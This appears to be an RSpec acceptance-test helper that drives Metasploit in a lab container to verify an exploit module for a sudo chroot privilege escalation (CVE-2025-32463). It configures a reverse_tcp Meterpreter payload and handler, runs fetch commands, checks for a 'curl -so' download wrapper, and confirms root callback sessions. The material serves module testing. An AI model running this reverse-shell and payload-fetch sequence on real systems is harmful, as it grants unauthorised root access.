# frozen_string_literal: true

require_relative '../sudo_chroot/acceptance'

# Default callback sessions have a separate lifecycle from finite commands.
module SudoChrootSessions
  include SudoChrootTarget

  DEFAULT_PAYLOAD = 'cmd/linux/http/x64/meterpreter/reverse_tcp'

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'sudo-sessions-owner.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def sc_ready
    super
    @rc.delete(:prepared)
    @rc[:callback_observer] = rc_json("begin;load 'test/module_targets/sudo_chroot_sessions/observe.rb';SudoChrootCallbackObservation.install(framework,#{target_runtime.fetch('artifacts').inspect});end")
    expect(@rc.fetch(:callback_observer)).to eq('installed' => true)
    @rc[:prepared] = true
  ensure
    rc_save
  end

  def ss_options(label)
    options = sc_fetch_options(label)
    server = TCPServer.new(@rc.fetch(:callback).fetch(:bind), 0)
    port = server.local_address.ip_port
    server.close
    options.merge('LHOST' => @rc.fetch(:callback).fetch(:host), 'LPORT' => port,
                  'ReverseListenerBindAddress' => @rc.fetch(:callback).fetch(:bind), 'WfsDelay' => 5)
  end

  def ss_native(action, argument)
    argv = target_runtime.fetch('compose') + ['exec', '-T', '--user', '0:0', 'linux', 'python3', '-B', '/opt/module-target-sudo-sessions/native.py', action, argument.to_s]
    output, error, status = Open3.capture3(*argv)
    @rc[:native] << { action: action, argv: argv, exit: status.exitstatus, stdout: output, stderr: error }
    rc_save
    expect(status.success?).to be(true), output + error
    JSON.parse(output)
  end

  def ss_session(attempt, expected_owner, uid, expected_cwd:)
    identifier = rc_poll(30) do
      ready = File.readlines(@rc.fetch(:session_observer).fetch('ready_event_path')).map { |line| JSON.parse(line).fetch('id') }
      rc_json('framework.sessions.map{|id,session|{id:id,type:session.type,owner:session.via_exploit,payload:session.via_payload}}').find do |row|
        ready.include?(row.fetch('id')) && row.values_at('type', 'owner', 'payload') == ['meterpreter', expected_owner, 'payload/' + DEFAULT_PAYLOAD]
      end
    end.fetch('id')
    attempt[:session] = { id: identifier }
    path = "/tmp/module-target-sudo-session-#{Process.pid}-callback-#{identifier}"
    attempt[:proof] = rc_json("LaravelSessionControl.proof(framework,#{identifier},#{path.inspect},'sudo-callback',false,component:'sudo')")
    attempt[:physical_proof] = sc_native('file', path)
    expect(attempt.fetch(:physical_proof)).to include('uid' => uid, 'base64' => Base64.strict_encode64('sudo-callback'))
    pid = attempt.fetch(:proof).fetch('pid')
    attempt[:physical_session] = ss_native('session-cwd', pid)
    # Capture the independent physical proof before a failing cwd API call.
    attempt[:callback_cwd] = rc_json("SudoChrootObservation.cwd(framework,#{identifier})")
    attempt[:relative_api] = rc_json("begin;s=framework.sessions.fetch(#{identifier});{entries:s.fs.dir.entries('.'),directory:s.fs.file.stat('.').directory?};rescue Rex::Post::Meterpreter::RequestError=>e;{error:e.class.name,message:e.message};end")
    rc_save
    aggregate_failures('New callback identity and usable cwd') do
      expect(attempt.fetch(:physical_session)).to include('uid' => uid, 'cwd_exists' => true, 'cwd_deleted' => false)
      expect(attempt.fetch(:physical_session).fetch('cwd')).to eq(expected_cwd)
      expect(attempt.fetch(:physical_session).fetch('executable_uid')).to eq(uid)
      expect(Base64.strict_decode64(attempt.fetch(:physical_session).fetch('executable_base64'))).to start_with("\x7fELF")
      expect(attempt.fetch(:callback_cwd)).to be_a(String)
      expect(attempt.fetch(:callback_cwd)).to eq(expected_cwd)
      expect(attempt.fetch(:relative_api)).to include('directory' => true, 'entries' => be_a(Array))
    end
    sc_native('remove', path)
  ensure
    rc_save
  end

  def ss_close(attempt)
    identifier = attempt.dig(:session, :id)
    return unless identifier

    attempt[:shutdown] = rc_json("LaravelSessionControl.shutdown(framework,#{identifier},component:'sudo')")
    rc_json("framework.sessions[#{identifier}]&.kill;true")
    if attempt[:proof]
      pid = attempt.fetch(:proof).fetch('pid')
      rc_poll(15) { sc_state.fetch('processes').none? { |row| row.fetch('pid') == pid } }
      attempt[:used_and_closed] = true if attempt[:physical_proof]
    end
    console_command('jobs -K')
    rc_save
  end

  def ss_cleanup_attempt(attempt)
    primary = $ERROR_INFO
    yield
  rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
    attempt[:cleanup_error] = { type: e.class.name, message: e.message } if attempt
    raise unless primary
  ensure
    rc_save
  end

  def ss_control(options)
    control = { options: options }
    @sc_case[:native_callbacks] ||= []
    @sc_case[:native_callbacks] << control
    expect(sc_native('file', '/tmp/module-target-sudo-native-callback-log')).to eq('exists' => false)
    console_command('back')
    console_command('use exploit/multi/handler')
    console_command('unset FETCH_WRITABLE_DIR')
    options.merge('PAYLOAD' => DEFAULT_PAYLOAD, 'ExitOnSession' => false).each { |name, value| console_command("set #{name} #{value}") }
    control[:handler] = console_command('run -j -z')
    control[:generated] = rc_json("begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'Native handler missing' unless job;{payload:job.ctx[1].refname,command:Base64.strict_encode64(job.ctx.first.payload.encoded),fetch_directory:job.ctx[1].datastore['FETCH_WRITABLE_DIR']};end")
    expect(control.fetch(:generated).fetch('payload')).to eq(DEFAULT_PAYLOAD)
    expect(control.fetch(:generated).fetch('fetch_directory')).to eq(options.fetch('FETCH_WRITABLE_DIR', './'))
    action = options.key?('FETCH_WRITABLE_DIR') ? 'command' : 'command-in-writable'
    control[:execution] = ss_native(action, control.fetch(:generated).fetch('command'))
    expect(control.fetch(:execution).fetch('exit')).to eq(0)
    ss_session(control, 'exploit/multi/handler', 1001, expected_cwd: action == 'command' ? '/home/lab' : '/tmp')
  ensure
    ss_cleanup_attempt(control) do
      ss_close(control) if control
      if control && control[:physical_proof]
        control[:fetched_binary] = sc_fetch_file(options, 1001)
        expect(control.fetch(:fetched_binary).fetch('sha256')).to eq(control.fetch(:physical_session).fetch('executable_sha256')) if control[:physical_session]
        control[:fixture_fetch_cleanup] = true
      end
      control[:native_log] = sc_native('file', '/tmp/module-target-sudo-native-callback-log') if control
      sc_native('remove', '/tmp/module-target-sudo-native-callback-log')
    end
  end

  def ss_case(kind)
    @sc_case = { kind: kind, calls: [], callbacks: [] }
    @rc[:cases] << @sc_case
    sc_idle
    sc_entry(kind)
    ss_control(ss_options('native-callback-' + kind))
    relative_control = ss_options('native-relative-' + kind)
    relative_control.delete('FETCH_WRITABLE_DIR')
    ss_control(relative_control)
    console_command('back')
    @sc_case[:cold_selection_output] = console_command('use ' + OWNER)
    @sc_case[:cold_default] = rc_json('{payload:active_module.datastore["PAYLOAD"],object:active_module.object_id,allow_no_cleanup:active_module.datastore["AllowNoCleanup"]}')
    expect(@sc_case.fetch(:cold_default)).to include('payload' => DEFAULT_PAYLOAD, 'allow_no_cleanup' => false)
    aggregate_failures('Repeated default callbacks and preservation') do
      2.times do |index|
        options = ss_options('owner-callback-' + kind + '-' + index.to_s)
        options.delete('FETCH_WRITABLE_DIR') if index.positive?
        options.merge!('AutoCheck' => @rc.fetch(:settings).fetch('vulnerable') ? index.zero? : true)
        offset = rc_json('framework.instance_variable_get(:@sudo_callback_events).length')
        call = sc_call('default-callback-' + index.to_s, options, 'run -z')
        call[:uploaded_wrappers] = rc_json("framework.instance_variable_get(:@sudo_callback_events).drop(#{offset})")
        @sc_case[:callbacks] << call
        rc_save
        checks = call.fetch(:events).filter_map { |event| event['check'] }
        if options.fetch('AutoCheck')
          expected_code = @rc.fetch(:settings).fetch('vulnerable') ? 'appears' : 'safe'
          expect(checks).to contain_exactly(include('code' => expected_code, 'reason' => a_string_matching(/\S/)))
        else
          expect(checks).to eq([])
        end
        bodies = call.fetch(:events).select { |event| event.values_at('event', 'method') == %w[call exploit] && event.fetch('source').end_with?('/sudo_chroot_cve_2025_32463.rb') }
        if @rc.fetch(:settings).fetch('vulnerable')
          expect(bodies.length).to eq(1)
          expect(call.fetch(:uploaded_wrappers).length).to eq(1)
          wrapper = Base64.strict_decode64(call.fetch(:uploaded_wrappers).first.fetch('wrapper_base64'))
          destination = (index.zero? ? '/tmp/' : './') + options.fetch('FETCH_FILENAME')
          expect(wrapper).to include('curl -so ' + destination + ' ')
          expect(call.fetch(:output)).not_to match(/Exploit failed|Exploit aborted|Exception|undefined method/)
          begin
            ss_session(call, OWNER, 0, expected_cwd: '/tmp')
          ensure
            ss_cleanup_attempt(call) do
              ss_close(call)
              if call[:physical_proof]
                if options.key?('FETCH_WRITABLE_DIR')
                  call[:fetched_binary] = sc_fetch_file(options, 0)
                  expect(call.fetch(:fetched_binary).fetch('sha256')).to eq(call.fetch(:physical_session).fetch('executable_sha256'))
                  call[:fixture_fetch_cleanup] = true
                else
                  call[:relative_fetch_artifact] = sc_native('file', '/tmp/' + options.fetch('FETCH_FILENAME'))
                  if call.fetch(:relative_fetch_artifact).fetch('exists')
                    expect(call.fetch(:relative_fetch_artifact).fetch('uid')).to eq(0)
                    expect(call.fetch(:relative_fetch_artifact).fetch('sha256')).to eq(call.fetch(:physical_session).fetch('executable_sha256'))
                    sc_native('remove', '/tmp/' + options.fetch('FETCH_FILENAME'))
                    call[:fixture_fetch_cleanup] = true
                  else
                    expect(call.fetch(:physical_session).fetch('executable_deleted')).to be(true)
                  end
                end
              end
            end
          end
        else
          expect(bodies).to eq([])
          expect(call.fetch(:uploaded_wrappers)).to eq([])
          expect(call.fetch(:output)).to include('not-vulnerable')
          expect(rc_json('framework.sessions.keys')).to eq([@sc_case.fetch(:session).fetch('id')])
        end
        call[:after_callback_cleanup] = sc_state
        rc_save
        expect(call.fetch(:cwd)).to eq('/home/lab')
        expect(call.fetch(:after_callback_cleanup)).to eq(@sc_case.fetch(:baseline))
      end
    end
    expect(@sc_case.fetch(:callbacks).map { |call| call.fetch(:selection).fetch('object') }.uniq).to eq([@sc_case.fetch(:cold_default).fetch('object')])
  ensure
    primary = $ERROR_INFO
    @sc_case[:failure] = { type: primary.class.name, message: primary.message } if primary && @sc_case
    rc_save
    begin
      ss_close_case
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      @sc_case[:cleanup_error] = { type: e.class.name, message: e.message } if @sc_case
      rc_save
      raise unless primary
    end
  end

  def ss_close_case
    return unless @sc_case

    attempts = [*@sc_case.fetch(:native_callbacks, []), *@sc_case.fetch(:callbacks, [])]
    attempts.each { |attempt| ss_close(attempt) if attempt[:session] && !attempt[:shutdown] }
    sc_close_case
  end

  def sc_cleanup
    ss_close_case if @sc_case
    return unless @rc&.[](:prepared)

    sc_idle
    rc_save
  end
end
